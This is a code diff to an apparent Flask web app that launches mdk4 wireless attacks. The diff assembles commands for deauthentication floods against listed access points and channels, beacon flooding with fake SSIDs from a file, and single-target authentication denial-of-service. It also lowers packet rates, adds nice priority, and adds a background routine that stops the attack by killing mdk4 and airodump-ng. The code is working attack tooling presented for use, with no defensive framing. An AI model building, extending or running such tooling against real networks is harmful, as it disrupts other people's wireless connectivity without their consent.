@@ -366,20 +366,23 @@ def start_mdk4():
                 for target in targets:
                     target_file.write(f"{target['bssid']},{target['channel']}\n")
                 target_file.close()
+                # 🔥 POWER AMAN: 200 pkts + nice priority
                 cmd = [
-                    "sudo", "mdk4", interface, "d",
+                    "sudo", "nice", "-n", "19",
+                    "mdk4", interface, "d",
                     "-B", target_file.name,
                     "-c", "h",
-                    "-s", "500"
+                    "-s", "200"
                 ]
                 current_targets = targets
             except Exception as e:
                 return jsonify({"status": "error", "message": str(e)})
         else:
             cmd = [
-                "sudo", "mdk4", interface, "d",
+                "sudo", "nice", "-n", "19",
+                "mdk4", interface, "d",
                 "-c", "h",
-                "-s", "500"
+                "-s", "200"
             ]
             current_targets = []
             
@@ -387,12 +390,14 @@ def start_mdk4():
         ssid_file = find_ssid_file()
         if not ssid_file:
             return jsonify({"status": "error", "message": "ssid_list.txt not found in ssid-fake folder"})
+        # 🔥 POWER AMAN: 200 pkts + nice priority
         cmd = [
-            "sudo", "mdk4", interface, "b",
+            "sudo", "nice", "-n", "19",
+            "mdk4", interface, "b",
             "-f", ssid_file,
             "-w", "a",
             "-m",
-            "-s", "500"
+            "-s", "200"
         ]
         current_targets = []
         
@@ -403,10 +408,12 @@ def start_mdk4():
                 warning_msg = f"Auth DOS only supports 1 target! Using: {target['essid']} ({target['bssid']})"
                 print(f"[!] {warning_msg}")
             
+            # 🔥 POWER AMAN: 500 pkts + nice priority
             cmd = [
-                "sudo", "mdk4", interface, "a",
+                "sudo", "nice", "-n", "19",
+                "mdk4", interface, "a",
                 "-a", target['bssid'],
-                "-s", "1000"
+                "-s", "500"
             ]
             current_targets = [target]
         else:
@@ -439,28 +446,61 @@ def start_mdk4():
     except Exception as e:
         return jsonify({"status": "error", "message": str(e)})
 
+# ====================== STOP ATTACK (BACKGROUND THREAD) ======================
+
+def stop_attack_async():
+    """Stop attack di background thread - GA NYEBABIN TIMEOUT"""
+    def _stop():
+        global attack_process, attack_running
+        print("[*] Stopping attack in background...")
+        
+        attack_running = False
+        
+        if attack_process:
+            try:
+                os.killpg(os.getpgid(attack_process.pid), signal.SIGTERM)
+                attack_process.wait(timeout=2)
+            except:
+                pass
+            attack_process = None
+        
+        subprocess.run("sudo pkill -f mdk4", shell=True, check=False)
+        subprocess.run("sudo pkill -f airodump-ng", shell=True, check=False)
+        
+        stop_monitor_thread()
+        global monitor_data
+        monitor_data = {
+            "clients": [],
+            "ap_status": "unknown",
+            "packets_sent": 0,
+            "last_update": None
+        }
+        print("[+] Attack stopped successfully")
+    
+    thread = threading.Thread(target=_stop)
+    thread.daemon = True
+    thread.start()
+
 @app.route('/stop_mdk4', methods=['POST'])
 def stop_mdk4():
     try:
-        stop_attack()
-        return jsonify({"status": "success", "message": "Attack stopped"})
+        stop_attack_async()
+        return jsonify({"status": "success", "message": "Attack stopping..."})
     except Exception as e:
-        print(f"[-] Error stopping attack: {e}")
         return jsonify({"status": "error", "message": str(e)})
 
 @app.route('/force_stop', methods=['POST'])
 def force_stop():
-    """Force stop semua proses"""
+    """Force stop - langsung kill semua proses"""
     global attack_process, attack_running, monitor_running
     
     try:
         print("[*] Force stopping all processes...")
-        
-        # Kill semua proses
         subprocess.run("sudo pkill -9 -f mdk4", shell=True, check=False)
         subprocess.run("sudo pkill -9 -f aireplay-ng", shell=True, check=False)
         subprocess.run("sudo pkill -9 -f airodump-ng", shell=True, check=False)
         
+        attack_running = False
         if attack_process:
             try:
                 attack_process.kill()
@@ -468,10 +508,7 @@ def force_stop():
                 pass
             attack_process = None
         
-        attack_running = False
-        monitor_running = False
-        
-        # Reset monitor data
+        stop_monitor_thread()
         global monitor_data
         monitor_data = {
             "clients": [],
